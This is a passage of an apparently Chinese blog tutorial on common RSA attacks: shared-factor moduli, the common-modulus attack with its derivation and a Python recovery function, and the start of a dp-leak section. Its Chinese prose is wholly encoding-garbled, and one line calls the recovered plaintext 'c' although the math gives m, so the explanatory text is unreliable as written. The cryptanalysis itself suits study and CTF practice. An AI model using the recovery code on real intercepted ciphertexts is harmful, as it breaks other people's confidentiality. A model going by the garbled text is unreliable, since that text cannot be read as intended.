encoding="application/x-tex">m^{\varphi(n)+1}\equiv m\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.938em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">Ï†</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p></li></ul><h1 id="Rsaå¸¸è§æ”»å‡»æ–¹å¼">Rsaå¸¸è§æ”»å‡»æ–¹å¼</h1><h2 id="å…³äºæ¨¡æ•°çš„æ”»å‡»">å…³äºæ¨¡æ•°çš„æ”»å‡»</h2><h3 id="æ¨¡ä¸äº’ç´ ">æ¨¡ä¸äº’ç´ </h3><p>æ”»å‡»åŸç†</p><p>å½“ä¸¤ä¸ªæ¨¡æ•°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>ä¸äº’ç´ çš„æ—¶å€™ï¼Œå…¶å…¬å› å­å°±æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>æˆ–<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>ï¼Œå› æ­¤å¯ä»¥ç›´æ¥å°†<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>åˆ†è§£</p><h3 id="å…±æ¨¡æ”»å‡»">å…±æ¨¡æ”»å‡»</h3><p>ç”Ÿæˆç§˜é’¥çš„è¿‡ç¨‹ä¸­ä½¿ç”¨äº†ç›¸åŒçš„æ¨¡æ•°nï¼Œæ­¤æ—¶ç”¨ä¸åŒçš„ç§˜é’¥eåŠ å¯†åŒä¸€ä¿¡æ¯mï¼š</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>m</mi><msub><mi>e</mi><mn>1</mn></msub></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c_1=m^{e_1}\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><msub><mi>e</mi><mn>2</mn></msub></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">c_2=m^{e_2}\mod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span></p><p>è‹¥æ˜¯ä¸¤æ¬¡ç”Ÿæˆçš„å…¬é’¥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Â </mtext><msub><mi>e</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\ e_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mspace">Â </span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> å’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Â </mtext><msub><mi>e</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\ e_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mspace">Â </span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> äº’ç´ ï¼Œåˆ™æ ¹æ®æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼Œå­˜åœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span> ä½¿å¾—ï¼š</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>s</mi><mo>âˆ—</mo><msub><mi>e</mi><mn>1</mn></msub><mo>+</mo><mi>t</mi><mo>âˆ—</mo><msub><mi>e</mi><mn>2</mn></msub><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">s*{e_1}+t*{e_2}=gcd(e_1,e_2)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></span></p><p>æ‰€ä»¥</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><msubsup><mi>c</mi><mn>1</mn><mi>s</mi></msubsup><msubsup><mi>c</mi><mn>2</mn><mi>t</mi></msubsup></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><msup><mi>m</mi><mrow><mi>s</mi><msub><mi>e</mi><mn>1</mn></msub></mrow></msup><msup><mi>m</mi><mrow><mi>t</mi><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><msup><mi>m</mi><mrow><mi>s</mi><msub><mi>e</mi><mn>1</mn></msub><mo>+</mo><mi>t</mi><msub><mi>e</mi><mn>2</mn></msub></mrow></msup><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>â‰¡</mo><mi>m</mi><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mi>n</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}  c_1^sc_2^t &amp;\equiv m^{se_1}m^{te_2} \mod n \\&amp;\equiv m^{se_1+te_2} \mod n \\&amp;\equiv m \mod n \end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.5071em;vertical-align:-2.0036em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5036em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8436em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.1564em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span><span style="top:-1.6564em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2.0036em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5036em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8436em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span><span style="top:-3.1564em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8436em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">t</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span><span style="top:-1.6564em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">m</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:2.0036em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>å› æ­¤åªè¦è®¡ç®—<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>c</mi><mn>1</mn><mi>s</mi></msubsup><msubsup><mi>c</mi><mn>2</mn><mi>t</mi></msubsup></mrow><annotation encoding="application/x-tex">c_1^sc_2^t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0417em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7936em;"><span style="top:-2.4519em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span></span></span></span>å³å¯å¾—å‡ºæ˜æ–‡c</p><p>æ­¤å¤„è´´ä¸Šé€šè§£ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> primefac<br><br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">same_n_attack</span>(<span class="hljs-params">n,e1,e2,c1,c2</span>):<br>     <span class="hljs-keyword">def</span> <span class="hljs-title function_">egcd</span>(<span class="hljs-params">a,b</span>):<br>         x, lastX = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>         y, lastY = <span class="hljs-number">1</span>, <span class="hljs-number">0</span><br>         <span class="hljs-keyword">while</span> (b != <span class="hljs-number">0</span>):<br>             q = a // b<br>             a, b = b, a % b<br>             x, lastX = lastX - q * x, x<br>             y, lastY = lastY - q * y, y<br>         <span class="hljs-keyword">return</span> (lastX, lastY)<br>     s = egcd(e1,e2)<br>     s1 = s[<span class="hljs-number">0</span>]<br>     s2 = s[<span class="hljs-number">1</span>]<br>     <span class="hljs-keyword">if</span> s1 &lt; <span class="hljs-number">0</span>:<br>         s1 = -s1<br>         c1 = primefac.modinv(c1, n)<br>         <span class="hljs-keyword">if</span> c1 &lt; <span class="hljs-number">0</span>:<br>             c1 += n<br>     <span class="hljs-keyword">elif</span> s2 &lt; <span class="hljs-number">0</span>:<br>         s2 = -s2<br>         c2 = primefac.modinv(c2, n)<br>         <span class="hljs-keyword">if</span> c2 &lt; <span class="hljs-number">0</span>:<br>             c2 += n<br>     m = (<span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n)) % n<br>     <span class="hljs-keyword">return</span> m<br></code></pre></td></tr></table></figure><h2 id="dpæ³„éœ²">dpæ³„éœ²</h2><p>é¦–å…ˆ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi><mo>â‰¡</mo><mi>d</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>â€‰</mtext><mtext>â€‰</mtext><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">dp \equiv d \mod (p-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>ï¼Œè¿™ä¸ª<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>p</mi></mrow><annotation 